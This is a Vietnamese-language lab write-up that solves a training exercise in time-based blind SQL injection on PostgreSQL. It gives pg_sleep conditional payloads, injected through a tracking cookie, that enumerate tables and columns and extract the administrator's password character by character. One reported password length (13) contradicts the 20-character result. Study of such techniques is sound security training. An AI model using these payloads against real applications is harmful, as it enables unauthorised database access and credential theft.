# **Lab: Blind SQL injection with time delays and information retrieval**

>  This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.  
>  The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.  
>  The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the `password` of the `administrator` user.  
>  To solve the lab, log in as the `administrator` user.  

# **Solution**

Sau khi thử gây lỗi syntax ở bộ lọc và TrackingId ở cookie sẽ không có gì khác biệt ở phản hồi. Lần này sẽ phải sử dụng phương pháp time trigger để kiêm tra.

Time trigger ở filter không hoạt động, thử ở TrackingId nào:

```
TrackingId=C3xlP40tm1IUKAZ4'|| (SELECT pg_sleep(10)) ||'
```

Okeyy, that works~~  
À nữa, đó là cú pháp của PostgreSQL. Tiếp tục sử dụng cú pháp của Post thôi

```
'|| (SELECT CASE WHEN (1=4) THEN pg_sleep(3) ELSE pg_sleep(0) END ) ||'
```

```
'|| (SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END ) ||'
```

Okey, chúng ta đã có cú pháp để kiểm tra điều kiện, giờ thì thử lấy tên các bảng nào. Thật may vì lab này không giới hạn độ dài của TrackingId :v

```
'||(SELECT CASE WHEN ((COUNT(*))=) THEN pg_sleep(3) ELSE pg_sleep(0) END FROM INFORMATION_SCHEMA.TABLES WHERE table_schema NOT IN ('information_schema', 'pg_catalog') AND table_type = 'BASE TABLE')||'
```

Okey. Truy vấn trên tôi đang đếm số các bảng do quản trị viên tạo để lưu dữ liệu. Các thông tin về bảng đều được lưu ở `INFORMATION_SCHEMA.TABLES`.  
Tôi thêm điều kiện lọc `table_schema NOT IN ('information_schema', 'pg_catalog') AND table_type = 'BASE TABLE'` để loại bỏ các bảng khác mà chúng ta không cần quan tâm đến. Mục đích của việc này để phục vụ quá trình bruteforce lấy tên các bảng liên quan tới web cần tấn công.

Và chúng ta có kết quả, có 3 bảng cần bruteforce để lấy tên.

```
'||(SELECT CASE WHEN ((LENGTH(TABLE_NAME))='§0§') THEN pg_sleep(3) ELSE pg_sleep(0) END FROM INFORMATION_SCHEMA.TABLES WHERE table_schema NOT IN ('information_schema', 'pg_catalog') AND table_type = 'BASE TABLE' LIMIT 1)||'
```

Truy vấn này để dò độ dài tên bảng thôi. Có thể thêm `OFFSET` vào sau LIMIT để lấy ra hàng mong muốn thực hiện so sánh.  
Sau cùng thì ta có độ dài `TABLE_NAME` của 3 bảng lần lượt là:

```
5
5 or 8 ~~ cái này đáng lo heng
5 or 8 ~~ lại nữa
```

Thôi thì đành thử với bảng đầu tiên trước xem sao

```
'||(SELECT CASE WHEN ((SUBSTRING(TABLE_NAME, 1, 1))='a') THEN pg_sleep(3) ELSE pg_sleep(0) END FROM INFORMATION_SCHEMA.TABLES WHERE table_schema NOT IN ('information_schema', 'pg_catalog') AND table_type = 'BASE TABLE' LIMIT 1 OFFSET 0)||'
```

Hãy dùng Intruder của Burpsuite để thực hiện Bruteforce, nó tiết kiệm rất nhiều thời gian. Bằng việc thay đổi giá trị `start_pos` trong `SUBSTRING` và `'a'` ta có thể tìm ra từng ký tự của tên bảng. Và ta thu được tên bảng đâu tiên:  

```
users
```

Nice, đây chắc sẽ là bảng chứa thông tin ngừoi dùng. Ta xem có các cột gì trong bảng nào:

```
'||(SELECT CASE WHEN ((COUNT(*))='3') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users')||'
```

-> Có 3 cột trong bảng `users`

```
'||(SELECT CASE WHEN ((LENGTH(COLUMN_NAME))='8') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users' ORDER BY COLUMN_NAME LIMIT 1 OFFSET 0)||'
```

Theo truy vấn trên, ta thu được độ dài tên các cột:

```
5
8
8
```

Okey, tương tự cách tìm tên bảng, giờ là tìm tên cột:

```
'||(SELECT CASE WHEN ((SUBSTRING(COLUMN_NAME, 1, 1))='u') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users' LIMIT 1 OFFSET 0)||'
```

Ta thu được:

```
email
username
password
```

Nice~~

tiếp theo vẫn là truy vấn lấy username và password thôi.

```
'||(SELECT CASE WHEN ((COUNT(*))='3') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users)||'
```

-> Có 3 user

```
'||(SELECT CASE WHEN ((LENGTH(username))='13') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users ORDER BY username LIMIT 1)||'
```

```
Độ dài: 13
```

```
'||(SELECT CASE WHEN ((SUBSTRING(username, 1, 1))='a') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users ORDER BY username LIMIT 1)||'
```

```
administrator
```

```
'||(SELECT CASE WHEN ((LENGTH(password))='20') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users ORDER BY username LIMIT 1)||'
```

```
-> password length: 13
```

```
'||(SELECT CASE WHEN ((SUBSTRING(password, 1, 1))='h') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users ORDER BY username LIMIT 1)||'
```

```
-> password: hbbfg4hz16jbehdy318l
```

DONE~~~

![image](https://i.pinimg.com/474x/37/81/49/3781495f0af90005c96520aee7cd0c21.jpg)